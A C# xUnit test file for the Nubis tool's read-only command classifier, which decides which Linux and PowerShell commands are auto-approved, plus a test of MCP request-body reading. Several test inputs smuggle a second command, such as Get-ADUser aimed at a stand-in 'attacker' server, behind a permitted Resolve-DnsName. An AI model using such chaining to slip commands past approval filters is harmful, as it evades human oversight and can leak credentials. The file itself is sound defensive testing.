using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Nubis;
using Xunit;

namespace Nubis.Tests;

/// <summary>8차 검수: 7차 Claude·MCP 수정분 재검토 (읽기 전용 판별 오탐 · 본문 읽기)</summary>
public class Review8ClaudeTests
{
    [Theory]
    [InlineData("systemctl status sshd")]
    [InlineData("systemctl status sshd -n 50 --no-pager")]
    [InlineData("journalctl -u nginx -n 50")]
    [InlineData("docker ps --no-trunc")]
    [InlineData("docker logs --since 10m --timestamps web")]
    public void 리눅스_흔한_조회는_여전히_자동_승인(string cmd) =>
        Assert.True(ReadOnlyCommands.IsReadOnly(cmd, CommandShell.Sh), cmd);

    [Theory]
    [InlineData("Get-Service")]
    [InlineData("Get-Service -ServiceName sshd")]
    [InlineData("Get-Process | Format-Table -AutoSize")]
    [InlineData("Get-ChildItem -Hidden")]
    [InlineData("Get-Content C:\\logs\\app.log -Tail 50")]
    [InlineData("Get-Item C:\\Windows")]
    [InlineData("Get-Acl C:\\Windows -Audit")]
    // DNS 서버 지정은 인증을 보내지 않는다 — 7차에서 -Server 를 막으면서 같이 막혔던 것
    [InlineData("Resolve-DnsName example.com -Server 8.8.8.8")]
    [InlineData("Resolve-DnsName -Name example.com -Type A -Server 1.1.1.1 | Select-Object -First 1")]
    public void PowerShell_흔한_조회는_여전히_자동_승인(string cmd) =>
        Assert.True(ReadOnlyCommands.IsReadOnly(cmd, CommandShell.PowerShell), cmd);

    [Theory]
    // Resolve-DnsName 예외를 빌려 다른 cmdlet 의 -Server 를 끼워 넣는 형태
    [InlineData("Resolve-DnsName x -Server 8.8.8.8; Get-ADUser bob -Server attacker")]
    [InlineData("Get-ADUser bob -Server attacker; Resolve-DnsName x")]
    [InlineData("Resolve-DnsName x | ForEach-Object { Get-ADUser bob -Server attacker }")]
    [InlineData("Resolve-DnsName x -Server 8.8.8.8 { Get-ADUser bob -Server attacker }")]
    [InlineData("Resolve-DnsName-x -Server attacker")]
    [InlineData("Resolve-DnsName x -Authentication Negotiate")]
    public void PowerShell_Server_예외_우회는_거부(string cmd) =>
        Assert.False(ReadOnlyCommands.IsReadOnly(cmd, CommandShell.PowerShell), cmd);

    /// <summary>한 번에 1바이트씩만 돌려주는 스트림 — UTF-8 다바이트 글자가 읽기 경계에서 잘리는 경우</summary>
    private sealed class TrickleStream(byte[] data) : Stream
    {
        private int _pos;
        public override bool CanRead => true;
        public override bool CanSeek => false;
        public override bool CanWrite => false;
        public override long Length => data.Length;
        public override long Position { get => _pos; set => throw new NotSupportedException(); }
        public override void Flush() { }
        public override int Read(byte[] buffer, int offset, int count)
        {
            if (_pos >= data.Length || count == 0) return 0;
            buffer[offset] = data[_pos++];
            return 1;
        }
        public override ValueTask<int> ReadAsync(Memory<byte> buffer, CancellationToken cancellationToken = default)
        {
            if (_pos >= data.Length || buffer.Length == 0) return new(0);
            buffer.Span[0] = data[_pos++];
            return new(1);
        }
        public override long Seek(long offset, SeekOrigin origin) => throw new NotSupportedException();
        public override void SetLength(long value) => throw new NotSupportedException();
        public override void Write(byte[] buffer, int offset, int count) => throw new NotSupportedException();
    }

    [Fact]
    public async Task 본문_다바이트_글자가_읽기_경계에서_잘려도_그대로()
    {
        var json = "{\"text\":\"호스트 가져오기 \u00e9\u4e2d\"}";
        var bytes = Encoding.UTF8.GetBytes(json);
        var withBom = new byte[bytes.Length + 3];
        withBom[0] = 0xEF; withBom[1] = 0xBB; withBom[2] = 0xBF;
        bytes.CopyTo(withBom, 3);
        Assert.Equal(json, await McpServer.ReadBodyAsync(new TrickleStream(bytes), 1024));
        Assert.Equal(json, await McpServer.ReadBodyAsync(new TrickleStream(withBom), 1024));
        // 한도와 정확히 같은 크기는 받고, 1바이트라도 넘으면 null
        Assert.Equal(json, await McpServer.ReadBodyAsync(new TrickleStream(bytes), bytes.Length));
        Assert.Null(await McpServer.ReadBodyAsync(new TrickleStream(bytes), bytes.Length - 1));
    }
}
